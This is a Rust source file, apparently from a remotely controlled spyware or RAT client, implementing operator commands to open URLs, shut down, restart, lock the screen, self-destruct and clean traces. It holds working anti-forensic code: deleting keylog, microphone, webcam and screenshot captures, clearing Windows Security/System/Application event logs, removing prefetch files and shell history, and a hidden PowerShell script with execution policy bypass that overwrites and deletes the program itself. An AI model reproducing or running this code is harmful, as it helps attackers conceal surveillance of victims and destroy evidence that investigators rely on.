use anyhow::{Result, Context};
use tokio::process::Command as AsyncCommand;
use std::time::Duration;

#[cfg(windows)]
use std::os::windows::process::CommandExt;

use crate::device_manager::DeviceManager;

/// –û—á–∏—â–∞–µ—Ç –≤—Å–µ –≤—Ä–µ–º–µ–Ω–Ω—ã–µ —Ñ–∞–π–ª—ã –∏ —Å–ª–µ–¥—ã —Ä–∞–±–æ—Ç—ã –ø—Ä–æ–≥—Ä–∞–º–º—ã
async fn cleanup_traces() -> Result<()> {
    #[cfg(windows)]
    {
        let cleanup_script = r#"
REM –û—á–∏—Å—Ç–∫–∞ –≤—Ä–µ–º–µ–Ω–Ω—ã—Ö —Ñ–∞–π–ª–æ–≤ –ø—Ä–æ–≥—Ä–∞–º–º—ã
del /f /q "%TEMP%\keylog_*.txt" 2>nul
del /f /q "%TEMP%\microphone_record_*.wav" 2>nul
del /f /q "%TEMP%\webcam_capture.jpg" 2>nul
del /f /q "%TEMP%\screenshot.png" 2>nul
del /f /q "%TEMP%\pentagon_destroy.bat" 2>nul

REM –û—á–∏—Å—Ç–∫–∞ –ª–æ–≥–æ–≤ Windows (—Ç—Ä–µ–±—É–µ—Ç –ø—Ä–∞–≤ –∞–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ç–æ—Ä–∞)
wevtutil cl Application 2>nul
wevtutil cl System 2>nul
wevtutil cl Security 2>nul

REM –û—á–∏—Å—Ç–∫–∞ prefetch
del /f /q "%WINDIR%\Prefetch\EYE*.pf" 2>nul

REM –û—á–∏—Å—Ç–∫–∞ –≤—Ä–µ–º–µ–Ω–Ω—ã—Ö —Ñ–∞–π–ª–æ–≤ —Å–∏—Å—Ç–µ–º—ã
del /f /q "%TEMP%\*" 2>nul
        "#;
        
        let temp_dir = std::env::temp_dir();
        let cleanup_path = temp_dir.join("cleanup_traces.bat");
        
        tokio::fs::write(&cleanup_path, cleanup_script).await?;
        
        let _output = AsyncCommand::new("cmd")
            .args(&["/C", cleanup_path.to_string_lossy().as_ref()])
            .output()
            .await?;
    }
    
    #[cfg(not(windows))]
    {
        // –û—á–∏—Å—Ç–∫–∞ –¥–ª—è Unix-—Å–∏—Å—Ç–µ–º
        let cleanup_commands = vec![
            "rm -f /tmp/keylog_*.txt",
            "rm -f /tmp/microphone_record_*.wav", 
            "rm -f /tmp/webcam_capture.jpg",
            "rm -f /tmp/screenshot.png",
            "rm -f /tmp/pentagon_destroy.sh",
            "history -c", // –û—á–∏—Å—Ç–∫–∞ –∏—Å—Ç–æ—Ä–∏–∏ –∫–æ–º–∞–Ω–¥
        ];
        
        for cmd in cleanup_commands {
            let _output = AsyncCommand::new("sh")
                .args(&["-c", cmd])
                .output()
                .await;
        }
    }
    
    Ok(())
}

/// –°–æ–∑–¥–∞–µ—Ç delayed deletion –º–µ—Ö–∞–Ω–∏–∑–º –¥–ª—è –±–µ–∑–æ–ø–∞—Å–Ω–æ–≥–æ —Å–∞–º–æ—É–Ω–∏—á—Ç–æ–∂–µ–Ω–∏—è –±–µ–∑ –∫–æ–Ω—Å–æ–ª—å–Ω—ã—Ö –æ–∫–æ–Ω
async fn create_delayed_deletion(exe_path: &str) -> Result<()> {
    // –ò—Å–ø–æ–ª—å–∑—É–µ–º PowerShell —Å –ø–æ–ª–Ω–æ—Å—Ç—å—é —Å–∫—Ä—ã—Ç—ã–º –≤—ã–ø–æ–ª–Ω–µ–Ω–∏–µ–º
    let powershell_script = format!(
        r#"
Start-Sleep -Seconds 5

# Pentagon Algorithm - 3-pass secure deletion
$targetFile = '{}'

# –ü—Ä–æ–≤–µ—Ä—è–µ–º —Å—É—â–µ—Å—Ç–≤–æ–≤–∞–Ω–∏–µ —Ñ–∞–π–ª–∞
if (Test-Path $targetFile) {{
    $fileSize = (Get-Item $targetFile).Length
    
    # Pass 1: –ù—É–ª–∏ (0x00)
    $zeros = New-Object byte[] $fileSize
    [System.IO.File]::WriteAllBytes($targetFile, $zeros)
    
    Start-Sleep -Milliseconds 500
    
    # Pass 2: –ï–¥–∏–Ω–∏—Ü—ã (0xFF)
    $ones = New-Object byte[] $fileSize
    for ($i = 0; $i -lt $fileSize; $i++) {{ $ones[$i] = 255 }}
    [System.IO.File]::WriteAllBytes($targetFile, $ones)
    
    Start-Sleep -Milliseconds 500
    
    # Pass 3: –°–ª—É—á–∞–π–Ω—ã–µ –¥–∞–Ω–Ω—ã–µ
    $random = New-Object byte[] $fileSize
    (New-Object Random).NextBytes($random)
    [System.IO.File]::WriteAllBytes($targetFile, $random)
    
    Start-Sleep -Milliseconds 500
    
    # –û–∫–æ–Ω—á–∞—Ç–µ–ª—å–Ω–æ–µ —É–¥–∞–ª–µ–Ω–∏–µ
    Remove-Item $targetFile -Force -ErrorAction SilentlyContinue
}}

# –û—á–∏—Å—Ç–∫–∞ –≤—Ä–µ–º–µ–Ω–Ω—ã—Ö —Ñ–∞–π–ª–æ–≤
Remove-Item "$env:TEMP\pentagon_*.ps1" -Force -ErrorAction SilentlyContinue
Remove-Item "$env:TEMP\autodestroy*.ps1" -Force -ErrorAction SilentlyContinue
"#, exe_path
    );

    let temp_dir = std::env::temp_dir();
    let script_path = temp_dir.join("pentagon_autodestroy.ps1");
    
    // –ó–∞–ø–∏—Å—ã–≤–∞–µ–º PowerShell —Å–∫—Ä–∏–ø—Ç
    tokio::fs::write(&script_path, powershell_script).await?;
    
    // –ó–∞–ø—É—Å–∫–∞–µ–º PowerShell –ø–æ–ª–Ω–æ—Å—Ç—å—é —Å–∫—Ä—ã—Ç–æ (–±–µ–∑ –æ–∫–æ–Ω)
    #[cfg(windows)]
    std::process::Command::new("powershell")
        .args(&[
            "-WindowStyle", "Hidden",
            "-NoProfile", 
            "-NonInteractive",
            "-ExecutionPolicy", "Bypass",
            "-File", &script_path.to_string_lossy()
        ])
        .creation_flags(0x08000000) // CREATE_NO_WINDOW
        .spawn()?;
    
    #[cfg(not(windows))]
    std::process::Command::new("powershell")
        .args(&[
            "-WindowStyle", "Hidden",
            "-NoProfile", 
            "-NonInteractive",
            "-ExecutionPolicy", "Bypass",
            "-File", &script_path.to_string_lossy()
        ])
        .spawn()?;
    
    // –î–∞–µ–º –≤—Ä–µ–º—è –Ω–∞ –∑–∞–ø—É—Å–∫ —Å–∫—Ä–∏–ø—Ç–∞
    tokio::time::sleep(std::time::Duration::from_millis(500)).await;
    
    Ok(())
}

/// –í—ã–ø–æ–ª–Ω—è–µ—Ç –∫–æ–º–∞–Ω–¥—É /url - –æ—Ç–∫—Ä—ã–≤–∞–µ—Ç URL –≤ –±—Ä–∞—É–∑–µ—Ä–µ –ø–æ —É–º–æ–ª—á–∞–Ω–∏—é
pub async fn handle_url_command(
    device_manager: &DeviceManager, 
    device_id: &str, 
    url: &str
) -> Result<String> {
    if !device_manager.is_valid_device_id(device_id) {
        return Err(anyhow::anyhow!("–£—Å—Ç—Ä–æ–π—Å—Ç–≤–æ —Å ID {} –Ω–µ –Ω–∞–π–¥–µ–Ω–æ", device_id));
    }

    device_manager.update_device_activity(device_id);
    
    // –ü—Ä–æ–≤–µ—Ä—è–µ–º, —á—Ç–æ URL –Ω–∞—á–∏–Ω–∞–µ—Ç—Å—è —Å –ø—Ä–æ—Ç–æ–∫–æ–ª–∞
    let formatted_url = if url.starts_with("http://") || url.starts_with("https://") {
        url.to_string()
    } else {
        format!("https://{}", url)
    };
    
    #[cfg(windows)]
    {
        let output = AsyncCommand::new("cmd")
            .args(&["/C", "start", "", &formatted_url])
            .output()
            .await
            .context("–ù–µ —É–¥–∞–ª–æ—Å—å –æ—Ç–∫—Ä—ã—Ç—å URL")?;
            
        if output.status.success() {
            Ok(format!("üåê URL –æ—Ç–∫—Ä—ã—Ç –≤ –±—Ä–∞—É–∑–µ—Ä–µ: {}", formatted_url))
        } else {
            let stderr = String::from_utf8_lossy(&output.stderr);
            Err(anyhow::anyhow!("–û—à–∏–±–∫–∞ –æ—Ç–∫—Ä—ã—Ç–∏—è URL: {}", stderr))
        }
    }
    
    #[cfg(target_os = "macos")]
    {
        let output = AsyncCommand::new("open")
            .arg(&formatted_url)
            .output()
            .await
            .context("–ù–µ —É–¥–∞–ª–æ—Å—å –æ—Ç–∫—Ä—ã—Ç—å URL")?;
            
        if output.status.success() {
            Ok(format!("üåê URL –æ—Ç–∫—Ä—ã—Ç –≤ –±—Ä–∞—É–∑–µ—Ä–µ: {}", formatted_url))
        } else {
            let stderr = String::from_utf8_lossy(&output.stderr);
            Err(anyhow::anyhow!("–û—à–∏–±–∫–∞ –æ—Ç–∫—Ä—ã—Ç–∏—è URL: {}", stderr))
        }
    }
    
    #[cfg(target_os = "linux")]
    {
        let output = AsyncCommand::new("xdg-open")
            .arg(&formatted_url)
            .output()
            .await
            .context("–ù–µ —É–¥–∞–ª–æ—Å—å –æ—Ç–∫—Ä—ã—Ç—å URL")?;
            
        if output.status.success() {
            Ok(format!("üåê URL –æ—Ç–∫—Ä—ã—Ç –≤ –±—Ä–∞—É–∑–µ—Ä–µ: {}", formatted_url))
        } else {
            let stderr = String::from_utf8_lossy(&output.stderr);
            Err(anyhow::anyhow!("–û—à–∏–±–∫–∞ –æ—Ç–∫—Ä—ã—Ç–∏—è URL: {}", stderr))
        }
    }
}

/// –í—ã–ø–æ–ª–Ω—è–µ—Ç –∫–æ–º–∞–Ω–¥—É /selfdestruct - —Å–∞–º–æ—É–Ω–∏—á—Ç–æ–∂–µ–Ω–∏–µ –ø—Ä–∏–ª–æ–∂–µ–Ω–∏—è —Å –∞–ª–≥–æ—Ä–∏—Ç–º–æ–º –ü–µ–Ω—Ç–∞–≥–æ–Ω–∞
pub async fn handle_selfdestruct_command(
    device_manager: &DeviceManager, 
    device_id: &str,
    confirmation: Option<&str>
) -> Result<String> {
    if !device_manager.is_valid_device_id(device_id) {
        return Err(anyhow::anyhow!("–£—Å—Ç—Ä–æ–π—Å—Ç–≤–æ —Å ID {} –Ω–µ –Ω–∞–π–¥–µ–Ω–æ", device_id));
    }

    device_manager.update_device_activity(device_id);
    
    // –ü—Ä–æ–≤–µ—Ä—è–µ–º –ø–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω–∏–µ
    if confirmation != Some("CONFIRM_DESTROY") {
        return Ok(format!(
            "üí£ –í–ù–ò–ú–ê–ù–ò–ï! –ö–æ–º–∞–Ω–¥–∞ —Å–∞–º–æ—É–Ω–∏—á—Ç–æ–∂–µ–Ω–∏—è —Ç—Ä–µ–±—É–µ—Ç –ø–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω–∏—è.\n\
            üî• –ë—É–¥–µ—Ç –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω –∞–ª–≥–æ—Ä–∏—Ç–º –ü–µ–Ω—Ç–∞–≥–æ–Ω–∞ (3-–ø—Ä–æ—Ö–æ–¥–Ω–∞—è –ø–µ—Ä–µ–∑–∞–ø–∏—Å—å)\n\
            ‚ö†Ô∏è –í–æ—Å—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–∏–µ —Ñ–∞–π–ª–∞ –±—É–¥–µ—Ç –Ω–µ–≤–æ–∑–º–æ–∂–Ω–æ!\n\
            –î–ª—è –ø–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω–∏—è –æ—Ç–ø—Ä–∞–≤—å—Ç–µ: /selfdestruct {} CONFIRM_DESTROY",
            device_id
        ));
    }
    
    #[cfg(windows)]
    {
        // –°–Ω–∞—á–∞–ª–∞ –≤—ã–ø–æ–ª–Ω—è–µ–º cleanup —Å–ª–µ–¥–æ–≤ 
        cleanup_traces().await?;
        
        // –ü–æ–ª—É—á–∞–µ–º –ø—É—Ç—å –∫ —Ç–µ–∫—É—â–µ–º—É –∏—Å–ø–æ–ª–Ω—è–µ–º–æ–º—É —Ñ–∞–π–ª—É
        let current_exe = std::env::current_exe()
            .context("–ù–µ —É–¥–∞–ª–æ—Å—å –æ–ø—Ä–µ–¥–µ–ª–∏—Ç—å –ø—É—Ç—å –∫ –∏—Å–ø–æ–ª–Ω—è–µ–º–æ–º—É —Ñ–∞–π–ª—É")?;
            
        let exe_path = current_exe.to_string_lossy();
        
        // –°–æ–∑–¥–∞–µ–º —É–ª—É—á—à–µ–Ω–Ω—ã–π delayed deletion –º–µ—Ö–∞–Ω–∏–∑–º
        create_delayed_deletion(&exe_path).await?;
        
        // –ü–ª–∞–Ω–∏—Ä—É–µ–º –∑–∞–≤–µ—Ä—à–µ–Ω–∏–µ –ø—Ä–æ—Ü–µ—Å—Å–∞ —á–µ—Ä–µ–∑ 5 —Å–µ–∫—É–Ω–¥
        tokio::spawn(async {
            tokio::time::sleep(Duration::from_secs(5)).await;
            std::process::exit(0);
        });
        
        return Ok(format!(
            "üíÄ [PENTAGON ALGORITHM] –°–ò–°–¢–ï–ú–ê –°–ê–ú–û–£–ù–ò–ß–¢–û–ñ–ï–ù–ê\n\
            üî• –í—Å–µ –¥–∞–Ω–Ω—ã–µ –±–µ–∑–≤–æ–∑–≤—Ä–∞—Ç–Ω–æ —É–¥–∞–ª–µ–Ω—ã\n\
            üßπ –°–ª–µ–¥—ã –æ—á–∏—â–µ–Ω—ã\n\
            ‚è±Ô∏è –ü—Ä–æ–≥—Ä–∞–º–º–∞ –∑–∞–≤–µ—Ä—à–∏—Ç—Å—è —á–µ—Ä–µ–∑ 5 —Å–µ–∫—É–Ω–¥...\n\
            \n\
            ‚úÖ –ò—Å–ø–æ–ª—å–∑—É–µ—Ç—Å—è –∞–ª–≥–æ—Ä–∏—Ç–º –ü–µ–Ω—Ç–∞–≥–æ–Ω–∞:\n\
            ‚Ä¢ Pass 1: –ü–µ—Ä–µ–∑–∞–ø–∏—Å—å –Ω—É–ª—è–º–∏ (0x00)\n\
            ‚Ä¢ Pass 2: –ü–µ—Ä–µ–∑–∞–ø–∏—Å—å –µ–¥–∏–Ω–∏—Ü–∞–º–∏ (0xFF)\n\
            ‚Ä¢ Pass 3: –°–ª—É—á–∞–π–Ω—ã–µ –¥–∞–Ω–Ω—ã–µ\n\
            ‚Ä¢ –£–¥–∞–ª–µ–Ω–∏–µ –≤—Ä–µ–º–µ–Ω–Ω—ã—Ö —Ñ–∞–π–ª–æ–≤\n\
            ‚Ä¢ –û—á–∏—Å—Ç–∫–∞ —Å–ª–µ–¥–æ–≤ –∞–∫—Ç–∏–≤–Ω–æ—Å—Ç–∏"
        ));
    }

    #[cfg(not(windows))]
    {
        // –î–ª—è Unix-—Å–∏—Å—Ç–µ–º –∏—Å–ø–æ–ª—å–∑—É–µ–º shred
        cleanup_traces().await?;
        
        let current_exe = std::env::current_exe()
            .context("–ù–µ —É–¥–∞–ª–æ—Å—å –æ–ø—Ä–µ–¥–µ–ª–∏—Ç—å –ø—É—Ç—å –∫ –∏—Å–ø–æ–ª–Ω—è–µ–º–æ–º—É —Ñ–∞–π–ª—É")?;
        let exe_path = current_exe.to_string_lossy();
        
        // –ö–æ–º–∞–Ω–¥–∞ shred –¥–ª—è 3-–ø—Ä–æ—Ö–æ–¥–Ω–æ–π –ø–µ—Ä–µ–∑–∞–ø–∏—Å–∏
        let _output = AsyncCommand::new("shred")
            .args(&["-vfz", "-n", "3", &exe_path])
            .output()
            .await;
            
        // –ü–ª–∞–Ω–∏—Ä—É–µ–º –∑–∞–≤–µ—Ä—à–µ–Ω–∏–µ –ø—Ä–æ—Ü–µ—Å—Å–∞
        tokio::spawn(async {
            tokio::time::sleep(Duration::from_secs(3)).await;
            std::process::exit(0);
        });
        
        Ok("üíÄ [PENTAGON ALGORITHM] –°–ò–°–¢–ï–ú–ê –°–ê–ú–û–£–ù–ò–ß–¢–û–ñ–ï–ù–ê\nüî• 3-–ø—Ä–æ—Ö–æ–¥–Ω–∞—è –ø–µ—Ä–µ–∑–∞–ø–∏—Å—å –≤—ã–ø–æ–ª–Ω–µ–Ω–∞\n‚è±Ô∏è –ü—Ä–æ–≥—Ä–∞–º–º–∞ –∑–∞–≤–µ—Ä—à–∏—Ç—Å—è...".to_string())
    }
}

/// –í—ã–ø–æ–ª–Ω—è–µ—Ç –∫–æ–º–∞–Ω–¥—É /shutdown - –≤—ã–∫–ª—é—á–µ–Ω–∏–µ —Å–∏—Å—Ç–µ–º—ã
pub async fn handle_shutdown_command(
    device_manager: &DeviceManager, 
    device_id: &str,
    delay: Option<u32>
) -> Result<String> {
    if !device_manager.is_valid_device_id(device_id) {
        return Err(anyhow::anyhow!("–£—Å—Ç—Ä–æ–π—Å—Ç–≤–æ —Å ID {} –Ω–µ –Ω–∞–π–¥–µ–Ω–æ", device_id));
    }

    device_manager.update_device_activity(device_id);
    
    let delay_seconds = delay.unwrap_or(30); // –ü–æ —É–º–æ–ª—á–∞–Ω–∏—é 30 —Å–µ–∫—É–Ω–¥
    
    #[cfg(windows)]
    {
        let output = AsyncCommand::new("shutdown")
            .args(&["/s", "/t", &delay_seconds.to_string()])
            .output()
            .await
            .context("–ù–µ —É–¥–∞–ª–æ—Å—å –∑–∞–ø—É—Å—Ç–∏—Ç—å –≤—ã–∫–ª—é—á–µ–Ω–∏–µ")?;
            
        if output.status.success() {
            Ok(format!("üîå –°–∏—Å—Ç–µ–º–∞ –±—É–¥–µ—Ç –≤—ã–∫–ª—é—á–µ–Ω–∞ —á–µ—Ä–µ–∑ {} —Å–µ–∫—É–Ω–¥", delay_seconds))
        } else {
            let stderr = String::from_utf8_lossy(&output.stderr);
            Err(anyhow::anyhow!("–û—à–∏–±–∫–∞ –≤—ã–∫–ª—é—á–µ–Ω–∏—è: {}", stderr))
        }
    }
    
    #[cfg(not(windows))]
    {
        let output = AsyncCommand::new("sudo")
            .args(&["shutdown", "-h", &format!("+{}", delay_seconds / 60)])
            .output()
            .await
            .context("–ù–µ —É–¥–∞–ª–æ—Å—å –∑–∞–ø—É—Å—Ç–∏—Ç—å –≤—ã–∫–ª—é—á–µ–Ω–∏–µ")?;
            
        if output.status.success() {
            Ok(format!("üîå –°–∏—Å—Ç–µ–º–∞ –±—É–¥–µ—Ç –≤—ã–∫–ª—é—á–µ–Ω–∞ —á–µ—Ä–µ–∑ {} —Å–µ–∫—É–Ω–¥", delay_seconds))
        } else {
            let stderr = String::from_utf8_lossy(&output.stderr);
            Err(anyhow::anyhow!("–û—à–∏–±–∫–∞ –≤—ã–∫–ª—é—á–µ–Ω–∏—è: {}", stderr))
        }
    }
}

/// –í—ã–ø–æ–ª–Ω—è–µ—Ç –∫–æ–º–∞–Ω–¥—É /restart - –ø–µ—Ä–µ–∑–∞–≥—Ä—É–∑–∫–∞ —Å–∏—Å—Ç–µ–º—ã
pub async fn handle_restart_command(
    device_manager: &DeviceManager, 
    device_id: &str,
    delay: Option<u32>
) -> Result<String> {
    if !device_manager.is_valid_device_id(device_id) {
        return Err(anyhow::anyhow!("–£—Å—Ç—Ä–æ–π—Å—Ç–≤–æ —Å ID {} –Ω–µ –Ω–∞–π–¥–µ–Ω–æ", device_id));
    }

    device_manager.update_device_activity(device_id);
    
    let delay_seconds = delay.unwrap_or(30);
    
    #[cfg(windows)]
    {
        let output = AsyncCommand::new("shutdown")
            .args(&["/r", "/t", &delay_seconds.to_string()])
            .output()
            .await
            .context("–ù–µ —É–¥–∞–ª–æ—Å—å –∑–∞–ø—É—Å—Ç–∏—Ç—å –ø–µ—Ä–µ–∑–∞–≥—Ä—É–∑–∫—É")?;
            
        if output.status.success() {
            Ok(format!("üîÑ –°–∏—Å—Ç–µ–º–∞ –±—É–¥–µ—Ç –ø–µ—Ä–µ–∑–∞–≥—Ä—É–∂–µ–Ω–∞ —á–µ—Ä–µ–∑ {} —Å–µ–∫—É–Ω–¥", delay_seconds))
        } else {
            let stderr = String::from_utf8_lossy(&output.stderr);
            Err(anyhow::anyhow!("–û—à–∏–±–∫–∞ –ø–µ—Ä–µ–∑–∞–≥—Ä—É–∑–∫–∏: {}", stderr))
        }
    }
    
    #[cfg(not(windows))]
    {
        let output = AsyncCommand::new("sudo")
            .args(&["shutdown", "-r", &format!("+{}", delay_seconds / 60)])
            .output()
            .await
            .context("–ù–µ —É–¥–∞–ª–æ—Å—å –∑–∞–ø—É—Å—Ç–∏—Ç—å –ø–µ—Ä–µ–∑–∞–≥—Ä—É–∑–∫—É")?;
            
        if output.status.success() {
            Ok(format!("üîÑ –°–∏—Å—Ç–µ–º–∞ –±—É–¥–µ—Ç –ø–µ—Ä–µ–∑–∞–≥—Ä—É–∂–µ–Ω–∞ —á–µ—Ä–µ–∑ {} —Å–µ–∫—É–Ω–¥", delay_seconds))
        } else {
            let stderr = String::from_utf8_lossy(&output.stderr);
            Err(anyhow::anyhow!("–û—à–∏–±–∫–∞ –ø–µ—Ä–µ–∑–∞–≥—Ä—É–∑–∫–∏: {}", stderr))
        }
    }
}

/// –í—ã–ø–æ–ª–Ω—è–µ—Ç –∫–æ–º–∞–Ω–¥—É /lock - –±–ª–æ–∫–∏—Ä–æ–≤–∫–∞ —ç–∫—Ä–∞–Ω–∞
pub async fn handle_lock_command(device_manager: &DeviceManager, device_id: &str) -> Result<String> {
    if !device_manager.is_valid_device_id(device_id) {
        return Err(anyhow::anyhow!("–£—Å—Ç—Ä–æ–π—Å—Ç–≤–æ —Å ID {} –Ω–µ –Ω–∞–π–¥–µ–Ω–æ", device_id));
    }

    device_manager.update_device_activity(device_id);
    
    #[cfg(windows)]
    {
        let output = AsyncCommand::new("rundll32")
            .args(&["user32.dll,LockWorkStation"])
            .output()
            .await
            .context("–ù–µ —É–¥–∞–ª–æ—Å—å –∑–∞–±–ª–æ–∫–∏—Ä–æ–≤–∞—Ç—å —ç–∫—Ä–∞–Ω")?;
            
        if output.status.success() {
            Ok("üîí –≠–∫—Ä–∞–Ω –∑–∞–±–ª–æ–∫–∏—Ä–æ–≤–∞–Ω".to_string())
        } else {
            let stderr = String::from_utf8_lossy(&output.stderr);
            Err(anyhow::anyhow!("–û—à–∏–±–∫–∞ –±–ª–æ–∫–∏—Ä–æ–≤–∫–∏ —ç–∫—Ä–∞–Ω–∞: {}", stderr))
        }
    }
    
    #[cfg(target_os = "macos")]
    {
        let output = AsyncCommand::new("pmset")
            .args(&["displaysleepnow"])
            .output()
            .await
            .context("–ù–µ —É–¥–∞–ª–æ—Å—å –∑–∞–±–ª–æ–∫–∏—Ä–æ–≤–∞—Ç—å —ç–∫—Ä–∞–Ω")?;
            
        if output.status.success() {
            Ok("üîí –≠–∫—Ä–∞–Ω –∑–∞–±–ª–æ–∫–∏—Ä–æ–≤–∞–Ω".to_string())
        } else {
            let stderr = String::from_utf8_lossy(&output.stderr);
            Err(anyhow::anyhow!("–û—à–∏–±–∫–∞ –±–ª–æ–∫–∏—Ä–æ–≤–∫–∏ —ç–∫—Ä–∞–Ω–∞: {}", stderr))
        }
    }
    
    #[cfg(target_os = "linux")]
    {
        // –ü—Ä–æ–±—É–µ–º —Ä–∞–∑–Ω—ã–µ –∫–æ–º–∞–Ω–¥—ã –±–ª–æ–∫–∏—Ä–æ–≤–∫–∏ –¥–ª—è Linux
        if let Ok(output) = AsyncCommand::new("xdg-screensaver").arg("lock").output().await {
            if output.status.success() {
                return Ok("üîí –≠–∫—Ä–∞–Ω –∑–∞–±–ª–æ–∫–∏—Ä–æ–≤–∞–Ω".to_string());
            }
        }
        
        if let Ok(output) = AsyncCommand::new("gnome-screensaver-command").arg("--lock").output().await {
            if output.status.success() {
                return Ok("üîí –≠–∫—Ä–∞–Ω –∑–∞–±–ª–æ–∫–∏—Ä–æ–≤–∞–Ω".to_string());
            }
        }
        
        Err(anyhow::anyhow!("–ö–æ–º–∞–Ω–¥—ã –±–ª–æ–∫–∏—Ä–æ–≤–∫–∏ —ç–∫—Ä–∞–Ω–∞ –Ω–µ–¥–æ—Å—Ç—É–ø–Ω—ã"))
    }
}

/// –í—ã–ø–æ–ª–Ω—è–µ—Ç –∫–æ–º–∞–Ω–¥—É /cleanup - –æ—á–∏—Å—Ç–∫–∞ —Å–ª–µ–¥–æ–≤ —Ä–∞–±–æ—Ç—ã –ø—Ä–æ–≥—Ä–∞–º–º—ã
pub async fn handle_cleanup_command(device_manager: &DeviceManager, device_id: &str) -> Result<String> {
    if !device_manager.is_valid_device_id(device_id) {
        return Err(anyhow::anyhow!("–£—Å—Ç—Ä–æ–π—Å—Ç–≤–æ —Å ID {} –Ω–µ –Ω–∞–π–¥–µ–Ω–æ", device_id));
    }

    device_manager.update_device_activity(device_id);
    
    // –í—ã–ø–æ–ª–Ω—è–µ–º –æ—á–∏—Å—Ç–∫—É —Å–ª–µ–¥–æ–≤
    cleanup_traces().await?;
    
    Ok("üßπ –û—á–∏—Å—Ç–∫–∞ —Å–ª–µ–¥–æ–≤ –∑–∞–≤–µ—Ä—à–µ–Ω–∞!\n‚úÖ –í—Ä–µ–º–µ–Ω–Ω—ã–µ —Ñ–∞–π–ª—ã —É–¥–∞–ª–µ–Ω—ã\n‚úÖ –õ–æ–≥–∏ –æ—á–∏—â–µ–Ω—ã\n‚úÖ Prefetch –æ—á–∏—â–µ–Ω".to_string())
}